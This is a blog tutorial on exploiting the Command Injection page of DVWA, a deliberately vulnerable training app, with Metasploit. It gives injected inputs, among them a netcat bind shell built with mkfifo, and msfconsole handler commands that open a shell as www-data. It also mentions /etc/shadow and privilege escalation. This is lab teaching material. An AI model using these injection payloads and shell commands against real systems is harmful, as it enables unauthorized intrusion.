---
layout: post
section-type: post
title: Exploiting Command Injection vulnerabilities
category: tech
tags: [ 'redteam', 'kali', 'dvwa', 'metasploit' ]
---
Command Injection is the manipulation of a vulnerable software in order to execute arbitrary commands on the host operating system.
Command Injections are possible when the application skips the input validation and uses it for executing a shell command on the host operating system.
in this post we'll get our hands on [DVWA]({% post_url 2017-04-02-dvwa-kali %})'s Command Injection section, and we'll open a backdoor on the server using [Metasploit](https://www.metasploit.com/).

Visit the *Command Injection* section of DVWA.

![ci-0](/img/posts/ci/ci-0.png)

The page says that it will ping an IP address for us, so let's see what will do for the IP *127.0.0.1*:

![ci-1](/img/posts/ci/ci-1.png)

Now, let's try to append a list bash command after our input IP address:

<pre><code data-trim class="bash">
127.0.0.1; ls
</code></pre>

![ci-2](/img/posts/ci/ci-2.png)

Sweet, DVWA simply appends our input to the underlying bash command!

Now, let's listen on port *4444* using netcat and redirect all the incoming bytes to a bash shell:

<pre><code data-trim class="bash">
127.0.0.1; mkfifo /tmp/pipe ; sh /tmp/pipe | nc -l -p 4444 > /tmp/pipe
</code></pre>

![ci-3](/img/posts/ci/ci-3.png)

As you will notice, the page is loading forever, which means that our backdoor is open and waiting for us... :smile:

Let's start msfconsole and open the shell on the server:

<pre><code data-trim class="bash">
⁠⁠⁠msfconsole
use exploit/multi/handler
set payload linux/x64/shell/bind_tcp
set RHOST 127.0.0.1
exploit
</code></pre>

![ci-4](/img/posts/ci/ci-4.png)

Note that we didn't set the LPORT of bind_tcp, since the default one is *4444*.

As you can see, we are the *www-data* user, and that's why we can't read the /etc/shadow file, which contains the user passwords of the operating system.
But, we have all the privileges that *www-data* user has and we can e.g. modify DVWA or escalate to root, by exploiting a local privilege escalation vulnerability.

Happy binding!
